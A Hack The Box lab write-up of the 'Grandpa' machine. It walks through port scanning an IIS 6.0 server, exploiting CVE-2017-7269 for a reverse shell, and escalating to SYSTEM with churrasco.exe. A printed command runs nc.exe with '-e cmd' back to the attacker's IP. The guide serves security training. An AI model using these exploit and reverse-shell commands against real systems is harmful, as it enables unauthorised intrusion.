---
title: "Grandpa"
date: 2023-08-10T11:30:03+00:00
tags: ["web","windows","Microsoft IIS 6.0","JuicyPotato", "Churrasco"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: "/HTB/Grandpa.png"
comments: false
description: "This is a friendly windows machine which has a vulnerability due to the low version of Microsoft IIS 6.0"
---

## Room Information

- Room name: Grandpa
- Difficulty level: Easy
- Room link: [https://app.hackthebox.com/machines/Grandpa](https://app.hackthebox.com/machines/Grandpa)

![/HTB/Grandpa.png](/HTB/Grandpa.png)

## Tools Used

- Nmap
- searchsploit
- gobuster
- smbserver.py
- msfvenom
- juicypotato.exe
- churrasco.exe
- nc.exe or nc64.exe

## Port ScanningOther room, other port scan.

```ruby
# Nmap 7.94 scan initiated Wed Aug 30 13:42:14 2023 as: nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn -oN escaneo 10.10.10.14
Nmap scan report for 10.10.10.14
Host is up, received user-set (0.20s latency).
Scanned at 2023-08-30 13:42:15 EDT for 39s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_  Server Date: Wed, 30 Aug 2023 17:42:48 GMT
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 30 13:42:54 2023 -- 1 IP address (1 host up) scanned in 40.34 seconds
```

I found 1 open ports, 80(http). So let's focus on the website…

## Enumeration

As usual, I did a scan with gobuster, but this time I know that the shots are not going that way, as I got practically nothing useful.

![Untitled](/HTB/web-grandpa.png)

So how on the **Granny** machine I ran the `davtest` program, but didn't get much:

```ruby
┌──(kali㉿kali)-[~/HTB/grandpa]
└─$ davtest -url http://10.10.10.14
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.14
********************************************************
NOTE	Random string for this session: 3CNJeh
********************************************************
 Creating directory
MKCOL		FAIL
********************************************************
 Sending test files
PUT	cfm	FAIL
PUT	jsp	FAIL
PUT	cgi	FAIL
PUT	html	FAIL
PUT	asp	FAIL
PUT	pl	FAIL
PUT	shtml	FAIL
PUT	txt	FAIL
PUT	php	FAIL
PUT	aspx	FAIL
PUT	jhtml	FAIL

********************************************************
/usr/bin/davtest Summary:
```

At this point I started to get frustrated…

## Exploiting

I started looking for versions of everything to see if they were subject to any vulnerability until I found one that corresponded to **Microsoft IIS version 6.0**, and I exploited it 😎

pd: **CVE-2017-7269**, website → [https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6 reverse shell](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell)

```ruby
python2 exploit.py 10.10.10.14 80 10.10.14.6 443
```

![Untitled](/HTB/pwn-grandpa.png)

## Escalation of privileges

The first thing I always do in **windows** is to see what user we are and if we can access any input flag. In this case I could not access any flag, so I had to escalate privileges. The next thing I did was to see the permissions I had, with `whoami /priv`.

```ruby
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
**-> SeImpersonatePrivilege        Impersonate a client after authentication Enabled** 
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

When I saw that the `SeImpersonatePrivilege` permission was enabled, the vulnerability called `JuicyPotato` came to my mind. 

So I will look for this vulnerability but according to the version of the victim machine because otherwise it would have no effect and we would waste our time. So I made a `systemminfo` and by the way I secured it in case I had to use it later for a vulnerability scan with `python2 windows-exploit-suggester.py -d 2023-08-30-mssb.xls -i /home/kali/HTB/granny/systemminfo.txt`. I got the following:

```ruby
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 4 Minutes, 10 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 808 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,342 MB
Page File: In Use:         128 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```

Now that I knew I was dealing with a `Microsoft(R) Windows(R) Server 2003, Standard Edition` all that was left was to look it up on the internet and download the exploit. The website → https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/

After this, the only thing left to do was to pass the exploit (churrasco.exe) through the smbserver to the victim machine together with the exploit I download previously called nc.exe or nc64.exe.

pd: website of nc.exe or nc64.exe → https://github.com/int0x33/nc.exe/blob/master/nc.exe

```ruby
C:\WINDOWS\Temp\privesc>churrasco.exe "\\10.10.14.6\\smbFolder\nc.exe -e cmd 10.10.14.6 443"
churrasco.exe "\\10.10.14.6\\smbFolder\nc.exe -e cmd 10.10.14.6 443"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x72c
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x724
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```

But before running this I set myself to listen on port 443, on my machine.

Then I was root 😎

```ruby
C:\DOCUME~1\Administrator\Desktop>whoami
whoami
nt authority\system

C:\DOCUME~1\Administrator\Desktop>typ root.txt
```

## Lessons Learned

- What insights did you gain from the room?
    
    I learned more about Microsoft IIS.
    
- Were there any novel tools or techniques employed?
    
    No
